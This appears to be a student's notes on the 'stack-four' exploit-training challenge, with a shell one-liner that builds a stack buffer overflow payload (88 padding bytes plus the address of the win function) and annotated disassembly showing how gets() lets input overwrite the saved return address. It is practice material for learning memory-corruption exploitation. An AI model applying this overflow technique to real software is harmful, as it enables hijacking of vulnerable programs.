# notes

testing with gdb:

```text
$ (printf 'A%.0s' {1..88}; printf '\x1d\x06\x40\x00\x00\x00\x00\x00') > ~/input.txt
$ gdb ./stack-four
> run < ~/input.txt
```

```text
                     complete_level
0040061d 55                      PUSH       RBP
0040061e 48 89 e5                MOV        RBP,RSP
00400621 bf f0 06 40 00          MOV        EDI=>msg_success,msg_success
00400626 e8 55 fe ff ff          CALL       <EXTERNAL>::puts
0040062b bf 00 00 00 00          MOV        EDI,0x0
00400630 e8 5b fe ff ff          CALL       <EXTERNAL>::exit

     undefined         AL:1           <RETURN>
     undefined8        Stack[0x0]:8   local_res0
     undefined8        Stack[-0x10]:8 local_10
     undefined1        Stack[-0x58]:1 usr_data_dst
                     start_level
00400635 55                      PUSH       RBP                                      stack offset = 0x8
00400636 48 89 e5                MOV        RBP,RSP
00400639 48 83 ec 50             SUB        RSP,0x50
0040063d 48 8d 45 b0             LEA        RAX=>usr_data_dst,[RBP + -0x50]          stack offset = 0x58 = 88 (decimal)
00400641 48 89 c7                MOV        RDI,RAX
00400644 e8 27 fe ff ff          CALL       <EXTERNAL>::gets
00400649 48 8b 45 08             MOV        RAX,qword ptr [RBP + local_res0]         rax        = rbp+0x8 <- user controlled
0040064d 48 89 45 f8             MOV        qword ptr [RBP + local_10],RAX           *(rbp-0x8) = rbp+0x8
00400651 48 8b 45 f8             MOV        RAX,qword ptr [RBP + local_10]           rax        = *(rbp+0x8)
00400655 48 89 c6                MOV        RSI,RAX                                  rsi        = &(rbp+0x8)
00400658 bf 33 07 40 00          MOV        EDI=>msg_returning,msg_returning
0040065d b8 00 00 00 00          MOV        EAX,0x0
00400662 e8 f9 fd ff ff          CALL       <EXTERNAL>::printf
00400667 90                      NOP
00400668 c9                      LEAVE                                                rsp = user controlled value
00400669 c3                      RET                                                  eip = user controlled value

                     main
0040066a 55                      PUSH       RBP
0040066b 48 89 e5                MOV        RBP,RSP
0040066e 48 83 ec 10             SUB        RSP,0x10
00400672 89 7d fc                MOV        dword ptr [RBP + local_c],EDI
00400675 48 89 75 f0             MOV        qword ptr [RBP + local_18],RSI
00400679 bf 50 07 40 00          MOV        EDI=>msg_welcome,msg_welcome
0040067e e8 fd fd ff ff          CALL       <EXTERNAL>::puts
00400683 b8 00 00 00 00          MOV        EAX,0x0
00400688 e8 a8 ff ff ff          CALL       start_level
0040068d b8 00 00 00 00          MOV        EAX,0x0
00400692 c9                      LEAVE
00400693 c3                      RET
```
